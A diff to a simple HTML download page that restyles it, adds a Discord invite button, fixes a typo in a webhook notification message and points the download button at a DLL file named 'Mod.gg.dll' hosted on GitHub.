@@ -1,14 +1,90 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Download My File</title>
+  <meta charset="UTF-8">
+  <title>Download Menu</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(-45deg, #1a1a1a, #2c2c2c, #1a1a1a, #0f0f0f);
+      background-size: 400% 400%;
+      animation: gradientBG 15s ease infinite;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+    }
+
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .card {
+      background-color: #000;
+      border: 2px solid red;
+      border-radius: 20px;
+      padding: 40px;
+      text-align: center;
+      box-shadow: 0 0 15px red;
+    }
+
+    .card h1 {
+      color: red;
+      margin-bottom: 10px;
+    }
+
+    .card p {
+      color: #ccc;
+      margin-bottom: 30px;
+    }
+
+    .button {
+      background-color: red;
+      border: none;
+      color: white;
+      padding: 12px 24px;
+      margin: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 12px;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+
+    .button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 10px red;
+    }
+
+    .discord-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      text-decoration: none;
+    }
+
+    .discord-icon {
+      width: 20px;
+      height: 20px;
+      filter: brightness(0) invert(1);
+    }
+  </style>
 </head>
-<body style="font-family: sans-serif; text-align: center; margin-top: 100px;">
+<body>
 
-  <h1>Welcome!</h1>
-  <p>Click the button below to download the menu.</p>
+  <div class="card">
+    <h1>Welcome!</h1>
+    <p>Click the button below to download the menu.</p>
 
-  <button onclick="sendWebhookAndDownload()">Download Now</button>
+    <button class="button" onclick="sendWebhookAndDownload()">Download</button>
+    <a class="button discord-btn" href="https://discord.gg/FGBsbdYvrq" target="_blank">
+      <img class="discord-icon" src="https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/svg/1f47e.svg" alt="Discord Icon">
+      Discord
+    </a>
+  </div>
 
   <script>
     function sendWebhookAndDownload() {
@@ -19,12 +95,12 @@
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-          content: '📥 A user has download the menu!'
+          content: '📥 A user has downloaded the menu!'
         })
       });
 
       // Trigger download
-      window.location.href = 'MyCoolTool.zip';
+      window.location.href = 'https://github.com/Liexxxx/Liexxxx.github.io/raw/refs/heads/main/Mod.gg.dll';
     }
   </script>
 
